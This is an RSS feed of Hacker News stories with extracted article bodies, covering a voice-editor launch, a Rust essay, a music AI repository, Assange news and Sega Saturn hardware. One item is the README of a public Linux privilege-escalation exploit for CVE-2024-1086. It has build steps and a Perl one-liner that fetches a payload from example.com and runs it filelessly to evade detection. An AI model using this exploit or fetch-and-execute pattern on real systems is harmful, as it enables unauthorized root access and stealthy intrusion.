<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Tue, 26 Mar 2024 19:00:05 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[HNInternal: Launch HN: Aqua Voice (YC W24) – Voice-driven text editor (159 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=39828686</link>
            <guid>39828686</guid>
            <pubDate>Tue, 26 Mar 2024 14:53:52 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=39828686">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><td><table>
        <tbody><tr id="39828686">
      <td><span></span></td>      <td><center><a id="up_39828686" href="https://news.ycombinator.com/vote?id=39828686&amp;how=up&amp;goto=item%3Fid%3D39828686"></a></center></td><td><span><a href="https://news.ycombinator.com/item?id=39828686">Launch HN: Aqua Voice (YC W24) – Voice-driven text editor</a></span></td></tr><tr><td colspan="2"></td><td><span>
          <span id="score_39828686">115 points</span> by <a href="https://news.ycombinator.com/user?id=the_king">the_king</a> <span title="2024-03-26T14:53:52"><a href="https://news.ycombinator.com/item?id=39828686">3 hours ago</a></span> <span id="unv_39828686"></span> | <a href="https://news.ycombinator.com/hide?id=39828686&amp;goto=item%3Fid%3D39828686">hide</a> | <a href="https://hn.algolia.com/?query=Launch%20HN%3A%20Aqua%20Voice%20(YC%20W24)%20%E2%80%93%20Voice-driven%20text%20editor&amp;type=story&amp;dateRange=all&amp;sort=byDate&amp;storyText=false&amp;prefix&amp;page=0">past</a> | <a href="https://news.ycombinator.com/fave?id=39828686&amp;auth=e0872b9e1c22c0075c378b742afff1418ad57d0a">favorite</a> | <a href="https://news.ycombinator.com/item?id=39828686">57&nbsp;comments</a>        </span>
              </td></tr>
    <tr></tr><tr><td colspan="2"></td><td><div><p>Hey HN! We’re Jack and Finn from Aqua Voice (<a href="https://www.withaqua.com/">https://www.withaqua.com/</a>). Aqua is a voice-native document editor that combines reliable dictation and natural language commands, letting you say things like: “make this a list” or “it’s Erin with an E” or “add an inline citation here for page 86 of this book”. Here is a demo: <a href="https://youtu.be/qwSAKg1YafM" rel="nofollow">https://youtu.be/qwSAKg1YafM</a>.</p><p>Finn, who is big-time dyslexic, has been using dictation software since the sixth grade when his dad set him up on Dragon Dictation. He used it through school to write papers, and has been keeping his own transcription benchmarks since college. All that time, writing with your voice has remained a cumbersome and brittle experience that is riddled with painpoints.</p><p>Dictation software is still terrible. All the solutions basically compete on accuracy (i.e. speech recognition), but none of them deal with the fundamentally brittle nature of the text that they generate. They don't try to format text correctly and require you to learn a bunch of specialized commands, which often are not worth it. They're not even close to a voice replacement for a keyboard.</p><p>Even post LLM, you are limited to a set of specific commands and the most accurate models don’t have any commands. Outside of these rules, the models have no sense for what is an instruction and what is content. You can’t say “and format this like an email” or “make the last bullet point shorter”. Aqua solves this.</p><p>This problem is important to Finn and millions of other people who would write with their voice if they could. Initially, we didn't think of it as a startup project. It was just something we wanted for ourselves. We thought maybe we'd write a novel with it - or something. After friends started asking to use the early versions of Aqua, it occurred to us that, if we didn't build it, maybe nobody would.</p><p>Aqua Voice is a text editor that you talk to like a person. Depending on the way that you say it and the context in which you're operating, Aqua decides whether to transcribe what you said verbatim, execute a command, or subtly modify what you said into what you meant to write.</p><p>For example, if you were to dictate: "Gryphons have classic forms resembling shield volcanoes," Aqua would output your text verbatim. But if you stumble over your words or start a sentence over a few times, Aqua is smart enough to figure that out and to only take the last version of the sentence.</p><p>The vision is not only to provide a more natural dictation experience, but to enable for the first time an AI-writing experience that feels natural and collaborative. This requires moving away from using LLMs for one-off chat requests and towards something that is more like streaming where you are in constant contact with the model. Voice is the natural medium for this.</p><p>Aqua is actually 6 models working together to transcribe, interpret, and rewrite the document according to your intent. Technically, executing a real-time voice application with a language model at its core requires complex coordination between multiple pieces. We use MoE transcription to outperform what was previously thought possible in terms of real-time accuracy. Then we sync up with a language model to determine what should be on the screen as quickly as possible.</p><p>The model isn't perfect, but it is ready for early adopters and we’ve already been getting feedback from grateful users. For example, a historian with carpal tunnel sent us an email he wrote using Aqua and said that he is now able to be five times as productive as he was previously. We've heard from other people with disabilities that prevent them from typing. We've also seen good adoption from people who are dyslexic or simply prefer talking to typing. It’s being used for everything from emails to brainstorming to papers to legal briefings.</p><p>While there is much left to do in terms of latency and robustness, the best experiences with Aqua are beginning to feel magical. We would love for you to try it out and give us feedback, which you can do with no account on <a href="https://withaqua.com/">https://withaqua.com</a>. If you find it useful, it’s $10/month after a 1000-token free trial. (We want to bump the free trial in the future, but we're a small team, and running this thing isn’t cheap.)</p><p>We’d love to hear your ideas and comments with voice-to-text!</p></div></td></tr>        <tr></tr><tr><td colspan="2"></td><td><form action="comment" method="post"></form></td></tr>  </tbody></table>
  </td></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Debian/Ubuntu privilege escalation PoC exploit for CVE-2024-1086 (261 pts)]]></title>
            <link>https://github.com/Notselwyn/CVE-2024-1086</link>
            <guid>39828424</guid>
            <pubDate>Tue, 26 Mar 2024 14:35:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/Notselwyn/CVE-2024-1086">https://github.com/Notselwyn/CVE-2024-1086</a>, See on <a href="https://news.ycombinator.com/item?id=39828424">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">CVE-2024-1086</h2><a id="user-content-cve-2024-1086" aria-label="Permalink: CVE-2024-1086" href="#cve-2024-1086"></a></p>
<p dir="auto">Universal local privilege escalation Proof-of-Concept exploit for <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1086" rel="nofollow">CVE-2024-1086</a>, working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.</p>
<details open="">
  <summary>
    
    <span aria-label="Video description exploit_poc.mp4">exploit_poc.mp4</span>
    <span></span>
  </summary>

  <video src="https://private-user-images.githubusercontent.com/68616630/316254619-a3d43951-94ab-4c09-a14b-07b81f89b3de.mp4?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE0NjkxMDQsIm5iZiI6MTcxMTQ2ODgwNCwicGF0aCI6Ii82ODYxNjYzMC8zMTYyNTQ2MTktYTNkNDM5NTEtOTRhYi00YzA5LWExNGItMDdiODFmODliM2RlLm1wND9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAzMjYlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMzI2VDE2MDAwNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTcxOTA1ODc5N2Y4ZWM4MGVhNTYyMDZlMDJmZWFiMzdlM2RiNzVlOGVmODllMTBmYTg5ZDhlYTRiOWRiODFmNTMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.4FB-UDF6i-8eY2FSN0hqc93yhvBFkPvNcaWj9Iu99IE" data-canonical-src="https://private-user-images.githubusercontent.com/68616630/316254619-a3d43951-94ab-4c09-a14b-07b81f89b3de.mp4?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE0NjkxMDQsIm5iZiI6MTcxMTQ2ODgwNCwicGF0aCI6Ii82ODYxNjYzMC8zMTYyNTQ2MTktYTNkNDM5NTEtOTRhYi00YzA5LWExNGItMDdiODFmODliM2RlLm1wND9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAzMjYlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMzI2VDE2MDAwNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTcxOTA1ODc5N2Y4ZWM4MGVhNTYyMDZlMDJmZWFiMzdlM2RiNzVlOGVmODllMTBmYTg5ZDhlYTRiOWRiODFmNTMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.4FB-UDF6i-8eY2FSN0hqc93yhvBFkPvNcaWj9Iu99IE" controls="controls" muted="muted">

  </video>
</details>

<p dir="auto"><h2 tabindex="-1" dir="auto">Blogpost / Write-up</h2><a id="user-content-blogpost--write-up" aria-label="Permalink: Blogpost / Write-up" href="#blogpost--write-up"></a></p>
<p dir="auto">A full write-up of the exploit - including background information and loads of useful diagrams - can be found in the <a href="https://pwning.tech/nftables/" rel="nofollow">Flipping Pages blogpost</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Affected versions</h2><a id="user-content-affected-versions" aria-label="Permalink: Affected versions" href="#affected-versions"></a></p>
<p dir="auto">The exploit affects versions from (including) v5.14 to (including) v6.6, excluding patched branches v5.15.149&gt;, v6.1.76&gt;, v6.6.15&gt;. The patch for these versions were released in feb 2024. The underlying vulnerability affects all versions (excluding patched stable branches) from v3.15 to v6.8-rc1.</p>
<p dir="auto"><strong>Caveats:</strong></p>
<ul dir="auto">
<li>The exploit does not work v6.4&gt; kernels with kconfig <code>CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y</code> (including Ubuntu v6.5)</li>
<li>The exploits requires user namespaces (kconfig <code>CONFIG_USER_NS=y</code>), that those user namespaces are unprivileged (sh command <code>sysctl kernel.unprivileged_userns_clone</code> = 1), and that nf_tables is enabled (kconfig <code>CONFIG_NF_TABLES=y</code>). By default, these are all enabled on Debian, Ubuntu, and KernelCTF. Other distro's have not been tested, but may work as well.</li>
<li>The exploit may be unstable on systems with a lot of network activity
<ul dir="auto">
<li>Systems with WiFi adapter, when surrounded by high-usage WiFi networks, will be very unstable.</li>
<li>On test devices, please turn off WiFi adapters through BIOS.</li>
</ul>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Usage</h2><a id="user-content-usage" aria-label="Permalink: Usage" href="#usage"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Configuration</h3><a id="user-content-configuration" aria-label="Permalink: Configuration" href="#configuration"></a></p>
<p dir="auto">The default values should work out of the box on Debian, Ubuntu, and KernelCTF with a local shell. On non-tested setups/distros, please make sure the kconfig values match with the target kernel. These can be specified in <a href="https://github.com/Notselwyn/CVE-2024-1086/blob/main/src/config.h"><code>src/config.h</code></a>. If you are running the exploit on a machine with more than 32GiB physical memory, make sure to increase <code>CONFIG_PHYS_MEM</code>.
If you are running the exploit over SSH (into the test machine) or a reverse shell, you may want to toggle <code>CONFIG_REDIRECT_LOG</code> to <code>1</code> to avoid unnecessary network activity.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Building</h3><a id="user-content-building" aria-label="Permalink: Building" href="#building"></a></p>
<p dir="auto">If this is impractical for you, there is an <a href="https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit">compiled x64 binary</a> with the default config.</p>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086
make"><pre>git clone https://github.com/Notselwyn/CVE-2024-1086
<span>cd</span> CVE-2024-1086
make</pre></div>
<p dir="auto">Binary: <code>CVE-2024-1086/exploit</code></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Running</h3><a id="user-content-running" aria-label="Permalink: Running" href="#running"></a></p>
<p dir="auto">Running the exploit is just as trivial:</p>

<p dir="auto">Fileless execution is also supported, in case of pentest situations where detections need to be avoided. However, Perl needs to be installed on the target:</p>
<div dir="auto" data-snippet-clipboard-copy-content="perl -e '
  require qw/syscall.ph/;

  my $fd = syscall(SYS_memfd_create(), $fn, 0);
  open(my $fh, &quot;>&amp;=&quot;.$fd);
  print $fh `curl https://example.com/exploit -s`;
  exec {&quot;/proc/$$/fd/$fd&quot;} &quot;memfd&quot;;
'"><pre>perl -e <span><span>'</span></span>
<span>  require qw/syscall.ph/;</span>
<span></span>
<span>  my $fd = syscall(SYS_memfd_create(), $fn, 0);</span>
<span>  open(my $fh, "&gt;&amp;=".$fd);</span>
<span>  print $fh `curl https://example.com/exploit -s`;</span>
<span>  exec {"/proc/$$/fd/$fd"} "memfd";</span>
<span><span>'</span></span></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Disclaimer</h2><a id="user-content-disclaimer" aria-label="Permalink: Disclaimer" href="#disclaimer"></a></p>
<p dir="auto">The programs and scripts ("programs") in this software directory/folder/repository ("repository") are published, developed and distributed for educational/research purposes only. I ("the creator") do not condone any malicious or illegal usage of the programs in this repository, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with the programs in this repository.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Visa, Mastercard Agree to Lower Swipe Fees, Settling Long-Running Lawsuit (148 pts)]]></title>
            <link>https://www.wsj.com/finance/banking/visa-mastercard-agree-to-lower-swipe-fees-settling-long-running-lawsuit-d6e5f0a8</link>
            <guid>39828091</guid>
            <pubDate>Tue, 26 Mar 2024 14:15:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.wsj.com/finance/banking/visa-mastercard-agree-to-lower-swipe-fees-settling-long-running-lawsuit-d6e5f0a8">https://www.wsj.com/finance/banking/visa-mastercard-agree-to-lower-swipe-fees-settling-long-running-lawsuit-d6e5f0a8</a>, See on <a href="https://news.ycombinator.com/item?id=39828091">Hacker News</a></p>
Couldn't get https://www.wsj.com/finance/banking/visa-mastercard-agree-to-lower-swipe-fees-settling-long-running-lawsuit-d6e5f0a8: Error: Request failed with status code 401]]></description>
        </item>
        <item>
            <title><![CDATA[VLC can't update on Android without giving Google private signing keys (107 pts)]]></title>
            <link>https://social.treehouse.systems/@Aissen/112139649840297169</link>
            <guid>39827828</guid>
            <pubDate>Tue, 26 Mar 2024 13:51:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://social.treehouse.systems/@Aissen/112139649840297169">https://social.treehouse.systems/@Aissen/112139649840297169</a>, See on <a href="https://news.ycombinator.com/item?id=39827828">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Tech Debt: My Rust Library Is Now a CDO (305 pts)]]></title>
            <link>https://lucumr.pocoo.org/2024/3/26/rust-cdo/</link>
            <guid>39827645</guid>
            <pubDate>Tue, 26 Mar 2024 13:36:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lucumr.pocoo.org/2024/3/26/rust-cdo/">https://lucumr.pocoo.org/2024/3/26/rust-cdo/</a>, See on <a href="https://news.ycombinator.com/item?id=39827645">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        
  

  
  <p>written on Tuesday, March 26, 2024
  

  </p><p>You're probably familiar with tech debt.  There is a joke that if there is
tech debt, surely there must be derivatives to work with that debt?  I'm
happy to say that the Rust ecosystem has created an environment where it
looks like one solution for tech debt is collateralization.</p>
<p>Here is how this miracle works.  Say you have a library <a href="https://github.com/mitsuhiko/insta">stuff</a> which depends on some other
library <a href="https://github.com/chyh1990/yaml-rust">learned-rust-this-way</a>.
The author of <cite>learned-rust-this-way</cite> at one point lost interest in this
thing and issues keep piling up.  Some of those issues are feature
requests, others are legitimate bugs.  However you as the person that
wrote <cite>stuff</cite> never ran into any of those problems.  Yet it's hard to
argue that <cite>learned-rust-this-way</cite> isn't tech debt.  It's one that does
not bother you all that much, but it's debt nonetheless.</p>
<p>At one point someone else figures out that <cite>learned-rust-this-way</cite> is debt.
One of the ways in which this happens is because the name is great.
Clearly that's not the only person that learned Rust this way and someone
else also wants that name.  Except the original author is unreachable.  So
now there is one more reason for that package <a href="https://github.com/rustsec/advisory-db/issues/1921">to get added to the RUSTSEC
database</a> and all
the sudden all hell breaks lose.  Within minutes CI will start failing for
a lot of people that directly or indirectly use <cite>learned-rust-this-way</cite>
notifying them that something happened.  That's because <cite>RUSTSEC</cite> is
basically a rating agency and they decided that your debt is now junk.</p>
<p>What happens next?  As the maintainer of <cite>stuff</cite> your users all the sudden
start calling you out for using <cite>learned-rust-this-way</cite> and you suffer.
Stress levels increase.  You gotta unload that shit.  Why?  Not because it
does not work for you, but someone called you out of that debt.  If we
really want to stress the financial terms this is your margin call.  Your
users demand action to deal with your debt.</p>
<p>So what can you do?  One option is to move to alternatives (unload the
debt).  In this particular case for whatever reason all the alternatives
to <cite>learned-rust-this-way</cite> are not looking very appealing either.  One is
a fork of that thing which also only has a single maintained, but all the
sudden pulls in 3 more dependencies, one of which already have a "B-"
rating.  Another option in the ecosystem just decided <a href="https://github.com/dtolnay/serde-yaml/commit/3ba8462f7d3b603d832e0daeb6cfc7168a673d7a">to default</a>
before they are called out.</p>
<p>Remember you never touched <cite>learned-rust-this-way</cite> actively.  It worked
for you in the unmaintained way of the last four years.  If you now fork
that library (and name it <cite>learned-rust-this-way-and-its-okay</cite>) you are
now subject to the same demands.  Forking that library is putting cash on
the pile of debt.  Except if you don't act up on the bug reports there,
you will eventually be called out like <cite>learned-rust-this-way</cite> was.  So
while that might buy you time, it does not really solve the issue.</p>
<p>However here is what actually does work: you just merge that code into
your own library.  Now that junk tech debt is suddenly rated “AAA”.  For
as long as you never touch that code any more, you never reveal to anyone
that you did that, and you just keep maintaining your library like you did
before, the world keeps spinning on.</p>
<p>So as of today: I collateralized <cite>yaml-rust</cite> by vendoring it in <cite>insta</cite>.
It's now an amalgamation of insta code and yaml-rust.  And by doing so, I
successfully upgraded this junk tech debt to a perfect AAA.</p>
<p>Who won?  I think nobody really.</p>


  
  <p>This entry was tagged
    
      <a href="https://lucumr.pocoo.org/tags/rust/">rust</a> and 
      <a href="https://lucumr.pocoo.org/tags/thoughts/">thoughts</a>
  

      </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Baltimore's Key Bridge struck by cargo ship, collapses (208 pts)]]></title>
            <link>https://www.wbaltv.com/article/baltimore-bridge-collapse-key-bridge/60303975</link>
            <guid>39827266</guid>
            <pubDate>Tue, 26 Mar 2024 12:58:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.wbaltv.com/article/baltimore-bridge-collapse-key-bridge/60303975">https://www.wbaltv.com/article/baltimore-bridge-collapse-key-bridge/60303975</a>, See on <a href="https://news.ycombinator.com/item?id=39827266">Hacker News</a></p>
Couldn't get https://www.wbaltv.com/article/baltimore-bridge-collapse-key-bridge/60303975: Error: Request failed with status code 451]]></description>
        </item>
        <item>
            <title><![CDATA[Hybrid-Net: Real-time audio source separation, generate lyrics, chords, beat (137 pts)]]></title>
            <link>https://github.com/DoMusic/Hybrid-Net</link>
            <guid>39827127</guid>
            <pubDate>Tue, 26 Mar 2024 12:42:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/DoMusic/Hybrid-Net">https://github.com/DoMusic/Hybrid-Net</a>, See on <a href="https://news.ycombinator.com/item?id=39827127">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Hybrid-Net</h2><a id="user-content-hybrid-net" aria-label="Permalink: Hybrid-Net" href="#hybrid-net"></a></p>
<p dir="auto">Real-time audio source separation, generate lyrics, chords, beat.</p>
<p dir="auto">A transformer-based hybrid multimodal model, various transformer models address different problems in the field of music information retrieval, these models generate corresponding information dependencies that mutually influence each other.</p>
<p dir="auto">An AI-powered multimodal project focused on music, generate chords, beats, lyrics, melody, and tabs for any song.</p>
<blockquote>
<p dir="auto">The online experience, <a href="https://lamucal.ai/" rel="nofollow">See the site here</a></p>
</blockquote>
 <p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/DoMusic/Hybrid-Net/blob/master/image/tnn.png"><img src="https://github.com/DoMusic/Hybrid-Net/raw/master/image/tnn.png"></a></p> 
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/DoMusic/Hybrid-Net/blob/master/image/model.png"><img src="https://github.com/DoMusic/Hybrid-Net/raw/master/image/model.png"></a></p>   
<p dir="auto"><code>U-Net</code> network model for audio source separation, <code>Pitch-Net</code>, <code>Beat-Net</code>, <code>Chord-Net</code> and <code>Segment-Net</code> based on the transformer model. Apart from establishing the correlation between the frequency and time, the most important aspect is to establish the mutual influence between different networks.</p>
<p dir="auto">The entire AI-powered process is implemented in <code>aitabs.py</code>, while the various network structure models can be referenced in the <code>models</code> folder.</p>
<blockquote>
<p dir="auto"><strong>Note</strong>: <code>U-Net</code> and <code>Segment-Net</code> use the stft spectrum of audio as input. <code>Beat-Net</code> uses three spectrograms of drums, bass, and other instruments as input,<code>Chord-Net</code> uses one spectrogram of the background music.</p>
</blockquote>
<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Chord</strong>, music chord detection, including major, minor, 7, maj7, min7, 6, m6, sus2, sus4, 5, and inverted chords. Determining the <strong>key</strong> of a song.</p>
</li>
<li>
<p dir="auto"><strong>Beat</strong>, music beat, downbeat detection and <strong>tempo</strong> (BPM) tracking</p>
</li>
<li>
<p dir="auto"><strong>Pitch</strong>, tracking the pitch of the melody in the vocal track.</p>
</li>
<li>
<p dir="auto"><strong>Music Structure</strong>, music segment boundaries and labels, include intro, verse, chorus, bridge and etc.</p>
</li>
<li>
<p dir="auto"><strong>Lyrics</strong>, music lyrics recognition and automatic lyrics to audio alignment, use ASR (whisper) to recognize the lyrics of the vocal track. The alignment of lyrics and audio is achieved through fine-tuning the wav2vec2 pre-training model. Currently, it supports dozens of languages, including English, Spanish, Portuguese, Russian, Japanese, Korean, Arabic, Chinese, and more.</p>
</li>
<li>
<p dir="auto"><strong>AI Tabs</strong>, Generate playable sheet music, including chord charts and six-line staves, using chords, beats, music structure information, lyrics, rhythm, etc. It supports editing functionalities for chords, rhythm, and lyrics.</p>
</li>
<li>
<p dir="auto"><strong>Other</strong>, audio source separation, speed adjustment, pitch shifting, etc.</p>
</li>
</ul>
<p dir="auto">For more AI-powered feature experiences, see the <a href="https://lamucal.ai/" rel="nofollow">website</a>:</p>
<p dir="auto">
  <a href="https://lamucal.ai/" rel="nofollow"><img height="50" src="https://github.com/DoMusic/Hybrid-Net/raw/master/image/website.png" alt="Lamucal.ai"></a>
</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Florida's DeSantis signs law restricting social media for people under 16 (114 pts)]]></title>
            <link>https://www.reuters.com/world/us/floridas-desantis-signs-law-restricting-social-media-people-under-16-2024-03-25</link>
            <guid>39827113</guid>
            <pubDate>Tue, 26 Mar 2024 12:41:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.reuters.com/world/us/floridas-desantis-signs-law-restricting-social-media-people-under-16-2024-03-25">https://www.reuters.com/world/us/floridas-desantis-signs-law-restricting-social-media-people-under-16-2024-03-25</a>, See on <a href="https://news.ycombinator.com/item?id=39827113">Hacker News</a></p>
Couldn't get https://www.reuters.com/world/us/floridas-desantis-signs-law-restricting-social-media-people-under-16-2024-03-25: Error: Request failed with status code 401]]></description>
        </item>
        <item>
            <title><![CDATA[Julian Assange granted permission to appeal against extradition to US (175 pts)]]></title>
            <link>https://www.theguardian.com/media/2024/mar/26/julian-assange-granted-permission-to-appeal-against-extradition-to-us</link>
            <guid>39826176</guid>
            <pubDate>Tue, 26 Mar 2024 10:37:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theguardian.com/media/2024/mar/26/julian-assange-granted-permission-to-appeal-against-extradition-to-us">https://www.theguardian.com/media/2024/mar/26/julian-assange-granted-permission-to-appeal-against-extradition-to-us</a>, See on <a href="https://news.ycombinator.com/item?id=39826176">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="maincontent"><p>Julian Assange has been handed a reprieve in his fight against extradition to the US after two judges ruled the WikiLeaks founder could take his case to an appeal hearing – but only if the Biden administration is unable to provide the court with suitable assurances.</p><p>The president of the king’s bench division, Victoria Sharp, and Mr Justice Johnson said Assange had real prospects of success on three of the nine grounds argued, but adjourned the leave to appeal application to give the US government three weeks to provide reassurance on the relevant matters.</p><p>If Assange had been denied permission to appeal he could have been extradited within days to face espionage charges. While the judges’ decision means he avoids that fate it leaves him facing a further wait, with his future still unresolved.</p><p>In <a href="https://www.judiciary.uk/judgments/assange-v-government-of-the-united-states-of-america-3/" data-link-name="in body link">a written judgment</a>, handed down on Tuesday morning, Sharp said the concerns that had real prospects of success at appeal but which “may be capable of being addressed by assurances” were “that the applicant [Assange] is permitted to rely on the first amendment, that the applicant is not prejudiced at trial, including sentence, by reason of his nationality, that he is afforded the same first amendment protections as a United States citizen, and that the death penalty is not imposed”.</p><p>At a two-day hearing last month, which Assange was too unwell to attend, <a href="https://www.theguardian.com/media/2024/feb/20/julian-assange-risks-flagrant-denial-of-justice-if-tried-in-us-london-court-told" data-link-name="in body link">his lawyers argued</a> that he faced a “flagrant denial of justice” if extradited to the US to face charges relating to the publication by Assange and WikiLeaks of thousands of classified and diplomatic documents they said had exposed torture, rendition, extrajudicial killings and war crimes.</p><p>His wife, Stella Assange, expressed dismay at the judges’ decision. “What the courts have done has been to invite a political intervention from the United States … send a letter saying ‘its all OK’,” she said. “I find this astounding.</p><p>“This case is a retribution. It is a signal to all of you that if you expose the interests that are driving war they will come after you, they will put you in prison and will try to kill you.</p><p>“The Biden administration should not issue assurances. They should drop this shameful case that should never have been brought.”</p><p>Ahead of the decision there had been <a href="https://www.theguardian.com/media/2024/mar/20/julian-assange-wikileaks-plea-deal" data-link-name="in body link">reports that the US government was considering a plea deal offer</a> to Assange, allowing him to admit to a misdemeanour, which would enable him to walk free from prison in the UK but his lawyers said they had been “given no indication” Washington intended to change its approach.</p><p>Sharp stated in Tuesday’s 66-page judgment that the UK home secretary’s lawyer had accepted that there was nothing in place to prevent Assange being charged in the US with an offence that carried the death penalty and it then being imposed.</p><p>She cited as evidence of such a risk “the calls for the imposition of the death penalty by leading politicians and other public figures; the fact that the [UK-US extradition] treaty does not preclude extradition for death penalty charges, and the fact that the existing assurance does not explicitly cover the death penalty”.</p><p>On free speech protections under the first amendment in the US, Sharp said: “He [Assange] contends that if he is given first amendment rights, the prosecution will be stopped. The first amendment is therefore of central importance to his defence to the extradition charge. Further, if he is convicted, he may wish to invoke the first amendment on the question of sentence. If he is not permitted to rely on the first amendment because of his status as a foreign national, he will thereby be prejudiced – potentially very greatly prejudiced – by reason of his nationality.”</p><p>The US has been given until 16 April to file its assurances. If it does not do so, leave to appeal will be granted. If it does provide assurances by that date the parties will be invited to file further written submissions on the issue of leave to appeal with another hearing provisionally listed for 20 May.</p><p>Michelle Stanistreet, the general secretary of the National Union of Journalists, welcomed the “temporary reprieve” but called on the US to pursue a plea deal.</p><p>“The conditionality around the grounds of appeal, which are contingent on the examination of US government assurances that he will not face the death penalty and has the right to free speech, mean the risks to Assange and press freedom remain stark,” she said.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Sega Saturn Architecture – A practical analysis (210 pts)]]></title>
            <link>https://www.copetti.org/writings/consoles/sega-saturn/</link>
            <guid>39825901</guid>
            <pubDate>Tue, 26 Mar 2024 09:51:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.copetti.org/writings/consoles/sega-saturn/">https://www.copetti.org/writings/consoles/sega-saturn/</a>, See on <a href="https://news.ycombinator.com/item?id=39825901">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><h2 id="imagery">Supporting imagery</h2><section><ul><li><a href="#cover-model">Model</a></li><li><a href="#cover-motherboard">Motherboard</a></li><li><a href="#cover-diagram">Diagram</a></li></ul></section><hr><h2 id="a-quick-introduction">A quick introduction</h2><p>Welcome to the 3D era! Well… <em>sorta</em>. Sega enjoyed quite a success with the Mega Drive so there’s no reason to force developers to write 3D games <em>right now</em>.</p><p>Just in case developers want the extra dimension, Sega adapted some bits of the hardware to enable polygon drawing as well. Hopefully, the result didn’t get out of hand!</p><hr><h2 id="cpu">CPU</h2><p>Just like its close competitors <a href="https://www.copetti.org/writings/consoles/playstation/#a-bit-of-history">drowned with options</a> during the RISC fever, Sega had to go through all the conundrums of choosing a new vendor that could bring up the next generation of games (including those with ‘3D’ capabilities). In the end, the company chose a fresh CPU whose creator was desperately looking for an adopter, the <strong>Hitachi SuperH</strong> or ‘SH’.</p><p>While initially focused on embedded applications, Hitachi’s new creation debuted modern arts such as <sup id="bibref:1"><a href="#bib:cpu-prog_manual" role="doc-biblioref">[1]</a></sup>:</p><ul><li>A <a href="https://www.copetti.org/writings/consoles/xbox/#tab-1-4-cisc-or-risc">load-store architecture</a>, meaning instructions don’t mix memory and register operations, resulting in a cleaner and scalable CPU design. This is one of the pillars of RISC CPUs.</li><li><strong>32-bit data bus and ALU</strong>, 